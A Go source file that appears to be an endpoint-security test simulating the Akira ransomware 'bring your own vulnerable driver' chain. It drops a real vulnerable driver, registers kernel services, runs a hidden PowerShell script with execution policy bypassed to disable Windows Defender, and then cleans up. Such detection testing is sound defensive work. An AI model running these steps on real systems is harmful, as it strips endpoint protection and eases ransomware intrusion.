//go:build windows
//+build windows

/*
ID: c3634a9c-e8c9-44a8-992b-0faeca14f612
NAME: Akira Ransomware BYOVD Attack Chain
TECHNIQUE: T1068,T1562.001
UNIT: response
CREATED: 2024-12-30
*/
package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed defender_disable.ps1
var defenderScript []byte

//go:embed rwdrv.sys
var realVulnerableDriver []byte

func checkAdminPrivileges() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

func createService(serviceName, displayName, binaryPath string) error {
	Endpoint.Say("Creating service: %s", serviceName)
	cmd := exec.Command("sc", "create", serviceName, 
		"binPath=", binaryPath,
		"DisplayName=", displayName,
		"type=", "kernel",
		"start=", "demand")
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(string(output), "already exists") {
			Endpoint.Say("Service %s already exists", serviceName)
			return nil
		}
		return fmt.Errorf("failed to create service %s: %v", serviceName, err)
	}
	
	Endpoint.Say("Successfully created service: %s", serviceName)
	return nil
}

func deleteService(serviceName string) error {
	Endpoint.Say("Deleting service: %s", serviceName)
	cmd := exec.Command("sc", "delete", serviceName)
	output, err := cmd.CombinedOutput()
	if err != nil && !strings.Contains(string(output), "does not exist") {
		return fmt.Errorf("failed to delete service %s: %v", serviceName, err)
	}
	return nil
}

func dropRealVulnerableDriver(targetDir string) error {
	filePath := filepath.Join(targetDir, "rwdrv.sys")
	
	Endpoint.Say("Dropping real vulnerable driver for signature detection: rwdrv.sys")
	err := os.WriteFile(filePath, realVulnerableDriver, 0644)
	if err != nil {
		return fmt.Errorf("failed to drop real vulnerable driver: %v", err)
	}
	
	Endpoint.Say("Real vulnerable driver dropped: rwdrv.sys (%d bytes)", len(realVulnerableDriver))
	return nil
}

func removeRealVulnerableDriver(targetDir string) {
	filePath := filepath.Join(targetDir, "rwdrv.sys")
	Endpoint.Say("Removing real vulnerable driver for safety")
	
	if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
		Endpoint.Say("Warning: Failed to remove real driver: %v", err)
	} else {
		Endpoint.Say("Real vulnerable driver safely removed")
	}
}

func simulateDriverDrop(targetDir, fileName string, size int64) error {
	filePath := filepath.Join(targetDir, fileName)
	
	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("failed to create %s: %v", fileName, err)
	}
	defer file.Close()
	
	if err := file.Truncate(size); err != nil {
		return fmt.Errorf("failed to set size for %s: %v", fileName, err)
	}
	
	dummyHeader := []byte{0x4D, 0x5A} // MZ header
	if _, err := file.Write(dummyHeader); err != nil {
		return fmt.Errorf("failed to write header to %s: %v", fileName, err)
	}
	
	Endpoint.Say("Created simulated driver: %s (%d bytes)", fileName, size)
	return nil
}

func executeDefenderDisable(scriptPath string) error {
	Endpoint.Say("Executing PowerShell script to disable Windows Defender")
	cmd := exec.Command("powershell.exe", 
		"-ExecutionPolicy", "Bypass", 
		"-WindowStyle", "Hidden",
		"-File", scriptPath)
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("PowerShell execution failed: %v, output: %s", err, string(output))
	}
	
	Endpoint.Say("PowerShell script executed successfully")
	return nil
}

func checkDefenderStatus() (bool, error) {
	cmd := exec.Command("powershell.exe", "-Command", 
		"Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisableAntiSpyware")
	
	output, err := cmd.Output()
	if err != nil {
		return false, nil // Registry key doesn't exist or access denied
	}
	
	result := strings.TrimSpace(string(output))
	return result == "1", nil
}

func readStatusFile(filePath string) string {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return ""
	}
	
	if len(data) >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
		data = data[3:]
	}
	return strings.TrimSpace(string(data))
}

func test() {
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("Dropper initialization failed")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("Starting Akira Ransomware BYOVD Attack Chain simulation")
	
	if !checkAdminPrivileges() {
		Endpoint.Say("Test requires administrator privileges - exiting as not relevant")
		Endpoint.Stop(Endpoint.NotRelevant)
	}
	
	targetDir := "c:\\F0"
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		Endpoint.Say("Failed to create target directory: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// ========================================
	// PHASE 1: SIGNATURE DETECTION TEST
	// ========================================
	Endpoint.Say("Phase 1: Real vulnerable driver signature detection test")
	
	// Drop real vulnerable driver for signature detection
	if err := dropRealVulnerableDriver(targetDir); err != nil {
		Endpoint.Say("Failed to drop real vulnerable driver: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	
	Endpoint.Say("Monitoring for signature-based detection (3 seconds)")
	Endpoint.Wait(3)
	
	realDriverPath := filepath.Join(targetDir, "rwdrv.sys")
	
	// Check if real driver was quarantined by signature detection
	if !Endpoint.Exists(realDriverPath) {
		Endpoint.Say("Real vulnerable driver was quarantined by signature detection!")
		Endpoint.Say("System is PROTECTED - signature detection working")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}
	
	// Real driver not quarantined - remove for safety and proceed with behavioral tests
	Endpoint.Say("Real driver not detected by signatures - removing for safety")
	removeRealVulnerableDriver(targetDir)
	
	// ========================================
	// PHASE 2: BEHAVIORAL DETECTION TEST
	// ========================================
	Endpoint.Say("Phase 2: Behavioral detection test with simulated drivers")
	
	// Now use dummy drivers for safe behavioral testing
	if err := simulateDriverDrop(targetDir, "rwdrv.sys", 15360); err != nil {
		Endpoint.Say("Failed to drop simulated rwdrv.sys: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	
	if err := simulateDriverDrop(targetDir, "hlpdrv.sys", 24576); err != nil {
		Endpoint.Say("Failed to drop simulated hlpdrv.sys: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("Checking for behavioral detection of simulated drivers")
	Endpoint.Wait(2)
	
	rwdrvPath := filepath.Join(targetDir, "rwdrv.sys")
	hlpdrvPath := filepath.Join(targetDir, "hlpdrv.sys")
	
	if !Endpoint.Exists(rwdrvPath) || !Endpoint.Exists(hlpdrvPath) {
		Endpoint.Say("Simulated drivers were quarantined by behavioral detection")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	// ========================================
	// PHASE 3: SERVICE CREATION TEST
	// ========================================
	Endpoint.Say("Phase 3: Creating malicious services")
	
	if err := createService("mgdsrv", "Malicious Guard Driver Service", rwdrvPath); err != nil {
		Endpoint.Say("Failed to create mgdsrv service: %v", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}
	
	if err := createService("KMHLPSVC", "Kernel Mode Helper Service", hlpdrvPath); err != nil {
		Endpoint.Say("Failed to create KMHLPSVC service: %v", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	// ========================================
	// PHASE 4: REGISTRY MANIPULATION TEST
	// ========================================
	Endpoint.Say("Phase 4: Attempting Windows Defender registry manipulation")
	
	scriptPath := filepath.Join(targetDir, "defender_disable.ps1")
	if err := os.WriteFile(scriptPath, defenderScript, 0644); err != nil {
		Endpoint.Say("Failed to write PowerShell script: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	statusFilePath := filepath.Join(targetDir, "status.txt")
	
	if err := executeDefenderDisable(scriptPath); err != nil {
		Endpoint.Say("PowerShell execution blocked: %v", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	Endpoint.Say("Waiting for registry modifications to complete")
	Endpoint.Wait(5)
	
	status := readStatusFile(statusFilePath)
	if status == "" {
		Endpoint.Say("Status file not found - PowerShell execution may have been blocked")
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	Endpoint.Say("PowerShell status: %s", status)

	if strings.Contains(status, "DEFENDER_DISABLED") {
		Endpoint.Say("Windows Defender registry manipulation succeeded")
		
		disabled, err := checkDefenderStatus()
		if err != nil {
			Endpoint.Say("Failed to verify Defender status: %v", err)
		} else if disabled {
			Endpoint.Say("Defender DisableAntiSpyware registry key confirmed set to 1")
		}
		
		Endpoint.Stop(Endpoint.Unprotected)
	} else if strings.Contains(status, "ACCESS_DENIED") {
		Endpoint.Say("Registry access was denied - potential EDR protection")
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	} else {
		Endpoint.Say("Unexpected status: %s", status)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}
}

func clean() {
	Endpoint.Say("Cleaning up BYOVD test artifacts")
	
	// Clean up services
	deleteService("mgdsrv")
	deleteService("KMHLPSVC")
	
	targetDir := "c:\\F0"
	filesToClean := []string{"rwdrv.sys", "hlpdrv.sys", "defender_disable.ps1", "status.txt"}
	
	// Clean up all test files (including both real and simulated drivers)
	for _, fileName := range filesToClean {
		filePath := filepath.Join(targetDir, fileName)
		if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
			Endpoint.Say("Warning: Failed to remove %s: %v", fileName, err)
		} else {
			Endpoint.Say("Removed: %s", fileName)
		}
	}
	
	// Ensure real vulnerable driver is definitely removed (safety check)
	realDriverPath := filepath.Join(targetDir, "rwdrv.sys")
	if Endpoint.Exists(realDriverPath) {
		Endpoint.Say("Safety check: Removing any remaining real vulnerable driver")
		removeRealVulnerableDriver(targetDir)
	}
	
	// Restore registry settings
	cmd := exec.Command("powershell.exe", "-Command", 
		"Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -ErrorAction SilentlyContinue")
	cmd.Run()
	
	Endpoint.Say("Cleanup completed - all artifacts removed")
}

func main() {
	Endpoint.Start(test, clean)
}